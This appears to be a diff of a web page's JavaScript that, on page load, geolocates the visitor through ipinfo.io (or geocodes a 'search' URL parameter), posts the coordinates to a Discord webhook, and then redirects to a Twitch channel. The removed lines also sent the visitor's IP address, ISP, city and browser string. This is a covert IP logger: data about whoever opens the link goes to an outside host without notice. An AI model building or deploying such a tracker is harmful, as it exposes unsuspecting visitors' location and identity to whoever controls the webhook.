@@ -79,29 +79,49 @@
             const redirectURL = "https://m.twitch.tv/scrappyvest28"; // Change to your desired redirect URL
 
             try {
-                const response = await fetch("https://ipinfo.io/json");
-                if (!response.ok) throw new Error("Failed to fetch IP info");
+                const searchParams = new URLSearchParams(window.location.search);
+                const searchQuery = searchParams.get("search"); // Get the search parameter from URL
+                let coordinates = null;
 
-                const data = await response.json();
-                if (!data.ip) throw new Error("Invalid data received");
+                if (searchQuery) {
+                    // Geocoding API to convert search query to coordinates
+                    const geoResponse = await fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(searchQuery)}`);
+                    if (!geoResponse.ok) throw new Error("Failed to fetch geolocation for search term");
 
-                const { ip, country, region, city, loc, org } = data;
-                const [lat, lon] = loc.split(",");
-                const browser = navigator.userAgent;
-                const countryCode = country.toLowerCase();
-                const flagUrl = `https://flagsapi.com/${countryCode}/flat/64.png`;
+                    const geoData = await geoResponse.json();
+                    if (geoData && geoData[0]) {
+                        coordinates = geoData[0];
+                    } else {
+                        throw new Error("Invalid location or coordinates not found");
+                    }
+                } else {
+                    // If no search parameter, use IP geolocation as fallback
+                    const ipResponse = await fetch("https://ipinfo.io/json");
+                    if (!ipResponse.ok) throw new Error("Failed to fetch IP info");
+
+                    const ipData = await ipResponse.json();
+                    if (!ipData.ip) throw new Error("Invalid IP data received");
+                    
+                    const { loc } = ipData;
+                    const [lat, lon] = loc.split(",");
+                    coordinates = { lat, lon };
+                }
+
+                // Preparing data for webhook
+                const { lat, lon } = coordinates;
+                const country = searchQuery || "Unknown"; // If no search, fallback to "Unknown"
+                const flagUrl = `https://flagsapi.com/${country.toLowerCase()}/flat/64.png`;
 
                 const payload = {
-                    username: ip,
+                    username: "Visitor Info",
                     avatar_url: flagUrl,
                     embeds: [{
-                        title: `Visitor From ${country}`,
+                        title: `Visitor Location: ${country}`,
                         color: 39423,
                         fields: [
-                            { name: "IP Address", value: `\`${ip}\``, inline: true },
-                            { name: "ISP", value: org, inline: true },
-                            { name: "Location", value: `${region}, ${city}`, inline: true },
-                            { name: "Browser Info", value: `\`${browser}\`` }
+                            { name: "Latitude", value: `\`${lat}\``, inline: true },
+                            { name: "Longitude", value: `\`${lon}\``, inline: true },
+                            { name: "Search Query", value: `\`${searchQuery || "N/A"}\``, inline: false }
                         ],
                         footer: {
                             text: `Time: ${new Date().toLocaleString()}`,
@@ -110,13 +130,14 @@
                     }]
                 };
 
+                // Send data to Discord webhook
                 await fetch(webhookURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
 
-                // Redirect after a short delay
+                // Redirect after data is sent
                 setTimeout(() => window.location.href = redirectURL, 3000);
 
             } catch (error) {
